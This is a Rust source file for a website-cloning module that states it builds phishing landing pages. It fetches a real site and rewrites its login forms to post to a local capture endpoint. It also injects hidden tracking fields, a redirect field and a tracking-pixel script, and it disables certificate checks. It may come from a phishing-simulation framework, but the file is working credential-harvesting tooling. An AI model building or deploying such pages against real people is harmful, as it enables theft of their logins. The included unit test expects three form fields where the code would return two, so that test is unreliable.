//! Website Cloner
//!
//! Clones websites for phishing landing pages.

use anyhow::{anyhow, Result};
use reqwest::Client;
use scraper::{Html, Selector};
use std::collections::HashMap;
use url::Url;

/// Website cloner for creating phishing landing pages
pub struct WebsiteCloner {
    client: Client,
}

impl Default for WebsiteCloner {
    fn default() -> Self {
        Self::new()
    }
}

impl WebsiteCloner {
    pub fn new() -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            .timeout(std::time::Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to build HTTP client");

        Self { client }
    }

    /// Clone a website and prepare it for phishing
    pub async fn clone_website(
        &self,
        url: &str,
        capture_credentials: bool,
        capture_fields: &[String],
        redirect_url: Option<&str>,
    ) -> Result<ClonedPage> {
        let base_url = Url::parse(url).map_err(|e| anyhow!("Invalid URL: {}", e))?;

        // Fetch the page
        let response = self
            .client
            .get(url)
            .send()
            .await
            .map_err(|e| anyhow!("Failed to fetch page: {}", e))?;

        if !response.status().is_success() {
            return Err(anyhow!("Failed to fetch page: HTTP {}", response.status()));
        }

        let html = response
            .text()
            .await
            .map_err(|e| anyhow!("Failed to read response: {}", e))?;

        // Parse and modify the HTML
        let modified_html = self.process_html(
            &html,
            &base_url,
            capture_credentials,
            capture_fields,
            redirect_url,
        ).await?;

        Ok(ClonedPage {
            original_url: url.to_string(),
            html: modified_html,
            capture_fields: capture_fields.to_vec(),
        })
    }

    /// Process HTML for phishing use
    async fn process_html(
        &self,
        html: &str,
        base_url: &Url,
        capture_credentials: bool,
        capture_fields: &[String],
        redirect_url: Option<&str>,
    ) -> Result<String> {
        let document = Html::parse_document(html);
        let mut modified_html = html.to_string();

        // Make relative URLs absolute
        modified_html = self.absolutize_urls(&modified_html, base_url);

        // Inline external CSS
        modified_html = self.inline_css(&document, base_url, &modified_html).await?;

        // Inline external JS (optional - may break functionality)
        // modified_html = self.inline_js(&document, base_url, &modified_html).await?;

        // If capturing credentials, modify forms
        if capture_credentials {
            modified_html = self.modify_forms(&modified_html, capture_fields, redirect_url)?;
        }

        // Add tracking script
        modified_html = self.add_tracking_script(&modified_html);

        Ok(modified_html)
    }

    /// Make relative URLs absolute
    fn absolutize_urls(&self, html: &str, base_url: &Url) -> String {
        let mut result = html.to_string();

        // Patterns for various URL attributes
        let patterns = [
            (r#"href=["']([^"']+)["']"#, "href"),
            (r#"src=["']([^"']+)["']"#, "src"),
            (r#"action=["']([^"']+)["']"#, "action"),
        ];

        for (pattern, attr) in patterns {
            if let Ok(re) = regex::Regex::new(pattern) {
                result = re.replace_all(&result, |caps: &regex::Captures| {
                    let url_str = &caps[1];
                    if url_str.starts_with("http://") || url_str.starts_with("https://") || url_str.starts_with("//") || url_str.starts_with("data:") {
                        caps[0].to_string()
                    } else if let Ok(absolute_url) = base_url.join(url_str) {
                        format!(r#"{}="{}""#, attr, absolute_url)
                    } else {
                        caps[0].to_string()
                    }
                }).to_string();
            }
        }

        result
    }

    /// Inline external CSS
    async fn inline_css(&self, document: &Html, base_url: &Url, html: &str) -> Result<String> {
        let link_selector = Selector::parse("link[rel='stylesheet']").unwrap();
        let mut modified = html.to_string();
        let mut inline_styles = String::new();

        for element in document.select(&link_selector) {
            if let Some(href) = element.value().attr("href") {
                // Convert to absolute URL
                let css_url = if href.starts_with("http://") || href.starts_with("https://") {
                    href.to_string()
                } else if href.starts_with("//") {
                    format!("https:{}", href)
                } else if let Ok(absolute) = base_url.join(href) {
                    absolute.to_string()
                } else {
                    continue;
                };

                // Fetch the CSS
                match self.client.get(&css_url).send().await {
                    Ok(response) if response.status().is_success() => {
                        if let Ok(css) = response.text().await {
                            inline_styles.push_str("<style>\n");
                            inline_styles.push_str(&css);
                            inline_styles.push_str("\n</style>\n");
                        }
                    }
                    _ => continue,
                }
            }
        }

        // Insert inline styles before </head>
        if !inline_styles.is_empty() {
            if let Some(pos) = modified.find("</head>") {
                modified.insert_str(pos, &inline_styles);
            }
        }

        Ok(modified)
    }

    /// Modify forms for credential capture
    fn modify_forms(
        &self,
        html: &str,
        capture_fields: &[String],
        redirect_url: Option<&str>,
    ) -> Result<String> {
        let mut modified = html.to_string();

        // Replace form actions with our capture endpoint
        if let Ok(re) = regex::Regex::new(r#"<form([^>]*)action=["'][^"']*["']([^>]*)>"#) {
            modified = re.replace_all(&modified, |caps: &regex::Captures| {
                format!(
                    r#"<form{} action="/submit" method="POST"{}>"#,
                    &caps[1], &caps[2]
                )
            }).to_string();
        }

        // Add hidden tracking field
        if let Ok(re) = regex::Regex::new(r#"<form([^>]*)>"#) {
            modified = re.replace_all(&modified, |caps: &regex::Captures| {
                format!(
                    r#"<form{}><input type="hidden" name="__tracking_id" value="{{{{.TrackingID}}}}">"#,
                    &caps[1]
                )
            }).to_string();
        }

        // Add redirect URL if specified
        if let Some(url) = redirect_url {
            if let Ok(re) = regex::Regex::new(r#"<form([^>]*)>"#) {
                modified = re.replace(&modified, |caps: &regex::Captures| {
                    format!(
                        r#"<form{}><input type="hidden" name="__redirect_url" value="{}">"#,
                        &caps[1], url
                    )
                }).to_string();
            }
        }

        Ok(modified)
    }

    /// Add tracking script to the page
    fn add_tracking_script(&self, html: &str) -> String {
        let tracking_script = r#"
<script>
(function() {
    // Track page load
    var img = new Image();
    img.src = '/p/{{.TrackingID}}.png?t=' + Date.now();

    // Track form submissions
    document.querySelectorAll('form').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            var tracking = document.createElement('input');
            tracking.type = 'hidden';
            tracking.name = '__timestamp';
            tracking.value = Date.now();
            form.appendChild(tracking);
        });
    });
})();
</script>
"#;

        // Insert before </body>
        if let Some(pos) = html.to_lowercase().rfind("</body>") {
            let mut modified = html.to_string();
            modified.insert_str(pos, tracking_script);
            modified
        } else {
            format!("{}{}", html, tracking_script)
        }
    }

    /// Extract form fields from a page
    pub fn extract_form_fields(&self, html: &str) -> Vec<FormField> {
        let document = Html::parse_document(html);
        let input_selector = Selector::parse("input, select, textarea").unwrap();
        let mut fields = Vec::new();

        for element in document.select(&input_selector) {
            let tag = element.value().name();
            let name = element.value().attr("name").unwrap_or_default().to_string();
            let field_type = element.value().attr("type").unwrap_or("text").to_string();
            let id = element.value().attr("id").map(String::from);
            let placeholder = element.value().attr("placeholder").map(String::from);

            if !name.is_empty() {
                fields.push(FormField {
                    tag: tag.to_string(),
                    name,
                    field_type,
                    id,
                    placeholder,
                });
            }
        }

        fields
    }

    /// Preview a landing page (render with sample data)
    pub fn preview_landing_page(&self, html: &str, tracking_id: &str) -> String {
        html.replace("{{.TrackingID}}", tracking_id)
            .replace("{{.FirstName}}", "John")
            .replace("{{.LastName}}", "Doe")
            .replace("{{.Email}}", "john.doe@example.com")
            .replace("${TrackingID}", tracking_id)
            .replace("${FirstName}", "John")
            .replace("${LastName}", "Doe")
            .replace("${Email}", "john.doe@example.com")
    }
}

/// Cloned page result
#[derive(Debug, Clone)]
pub struct ClonedPage {
    pub original_url: String,
    pub html: String,
    pub capture_fields: Vec<String>,
}

/// Form field extracted from a page
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct FormField {
    pub tag: String,
    pub name: String,
    pub field_type: String,
    pub id: Option<String>,
    pub placeholder: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_form_fields() {
        let html = r#"
        <html>
        <body>
            <form>
                <input type="text" name="username" placeholder="Username">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
        "#;

        let cloner = WebsiteCloner::new();
        let fields = cloner.extract_form_fields(html);

        assert_eq!(fields.len(), 3);
        assert_eq!(fields[0].name, "username");
        assert_eq!(fields[1].name, "password");
    }
}
